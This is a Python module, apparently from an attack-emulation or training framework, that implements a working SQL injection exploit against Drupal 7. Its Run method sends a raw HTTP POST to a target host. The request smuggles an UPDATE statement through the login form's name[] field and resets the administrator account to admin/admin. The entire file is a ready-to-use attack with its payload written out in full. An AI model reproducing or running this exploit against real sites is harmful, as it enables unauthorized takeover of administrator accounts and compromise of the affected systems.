"""
    This module exploits a Drupal SQL injection to set the password of
    the admin account to admin.
"""
from abstract_circadence_phase import AbstractCircadencePhase
import time
import socket

class Drupal730AdminPass(AbstractCircadencePhase):
    TrackerId = 'Drupal730adminpass'
    Subject = 'Drupal_SQL_injection_exploit'
    Description =   """
                    The 'Drupal730adminpass' phase uses a SQL injection
                    to reset username and password of the admin account
                    to admin/admin
                    """
    
    required_input_parameters = {'RHOST': None, 'RPORT': 80, 'path': None}
    output_parameters = {}

    def __init__(self, info):
        """
            Initialize the exploit.

            @param info: Initialization dictionary

            @requires: C{info} dictionary requires
                an I{'RHOST'} key as a string,
                a I{'RPORT'} key,
                and a I{'path'} key as a string.
        """
        AbstractCircadencePhase.__init__(self, info=info)

        assert 'RHOST' in info.keys()
        assert 'RPORT' in info.keys()

    def Setup(self):
        """
            Initialize phase arguments.
            @requires: Must return True.
        """
        rhost = self.PhaseResult['RHOST']
        port = self.PhaseResult['RPORT']

        if 'path' not in self.PhaseResult:
            path = rhost
        else:
            path = self.PhaseResult['path']

        if path.startswith("http://"):
            path = path.replace("http://", "")
        if path.endswith("/"):
            path = path.replace("/", "")

        port = int(port)

        self._path = path
        self._port = port
        self._rhost = rhost

        return True

    def Run(self):
        """
            Execute the exploit.  Return when complete.
        """
        data = "POST " + "http://" + self._path + "/?q=node&destination=node HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 232\r\n\r\nname[0%20;update+users+set+name%3D'admin'+,+pass+%3d+'%24S%24CTo9G7Lx2rJENglhirA8oi7v9LtLYWFrGm.F.0Jurx3aJAmSJ53g'+where+uid+%3D+'1';;#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._rhost, self._port))

        s.send(bytes(data))

        reply = ""

        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            reply += str(chunk)

        s.close()
        self._progress = 100
        return True


def create(info):
    """
        Create a new instance of the exploit object.
        @param info: a dict of module specific settings
    """
    return Drupal730AdminPass(info)
